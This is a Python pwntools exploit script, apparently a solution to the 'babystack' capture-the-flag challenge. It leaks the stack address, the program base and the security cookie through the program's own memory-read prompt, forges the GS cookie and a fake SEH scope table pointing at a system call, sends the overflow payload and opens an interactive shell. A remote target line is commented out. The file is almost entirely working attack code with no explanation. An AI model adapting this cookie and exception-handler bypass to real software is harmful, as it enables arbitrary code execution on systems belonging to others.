from pwn import *
#context.update(log_level='debug')

#debug = 0
#if debug == 1:
p = process('./babystack')
#   elf = ELF('./babystack')
#else:
#    p = remote('192.168.44.149', 10009)

def get_value(addr):
    p.recvuntil('Do you want to know more?\r\n')
    p.sendline('yes')
    p.recvuntil('Where do you want to know\r\n')
    p.sendline(str(addr))
    p.recvuntil('value is ')
    value = int(p.recvuntil('\n', drop=True), 16)
    return value


p.recvuntil('stack address = ')
stack_addr = int(p.recvuntil('\n', drop=True), 16)
ebp_addr = stack_addr + 0x9c
p.recvuntil('main address = ')
main_addr = int(p.recvuntil('\n', drop=True), 16)
plt_base = main_addr - 0x10b0
print('plt_base:',hex(plt_base))
system_addr = plt_base + 0x138d


security_cookie_addr = plt_base + 0x4004
print('security_cookie:',hex(security_cookie_addr),type(security_cookie_addr)) 
security_cookie = get_value(security_cookie_addr)
GS_Cookie = security_cookie ^ (ebp_addr)
print('security_cookie:',hex(security_cookie),'GS_Cookie:',hex(GS_Cookie))
seh_next_addr = ebp_addr - 0x10
seh_next = get_value(seh_next_addr)
print('seh_next:',hex(seh_next))
except_handler_addr = ebp_addr - 0xc
except_handler = get_value(except_handler_addr)
print('except_handler:',hex(except_handler))

fake_scope_table = p32(0x0FFFFFFE4)     #GSCookieOffset
fake_scope_table += p32(0)              #GSCookieXOROffset
fake_scope_table += p32(0x0FFFFFF20)    #EHCookieOffset
fake_scope_table += p32(0)              #EHCookieXOROffset
fake_scope_table += p32(0x0FFFFFFFE)    #ScopeRecord.EnclosingLevel
fake_scope_table += p32(system_addr)    #ScopeRecord.FilterFunc
fake_scope_table_addr = stack_addr + 0x10

payload  = b'a' * 0x10
payload += fake_scope_table
payload = payload.ljust(0x9c - 0x1c, b'b')
payload += p32(GS_Cookie)                   #GS_Cookie
payload += b'a'*8
payload += p32(seh_next)                    #seh_next
payload += p32(except_handler)              #except_handler
payload += p32(fake_scope_table_addr^security_cookie)    #scope_table
payload += p32(0)
print(bytes(payload))
p.recvuntil('Do you want to know more?\r\n')
p.sendline('n')
#p.recvuntil('Where do you want to know\r\n')
p.sendline(payload)

p.recvuntil('Do you want to know more?\r\n')
p.sendline('yes')
p.recvuntil('Where do you want to know\r\n')
p.sendline('0')

p.interactive()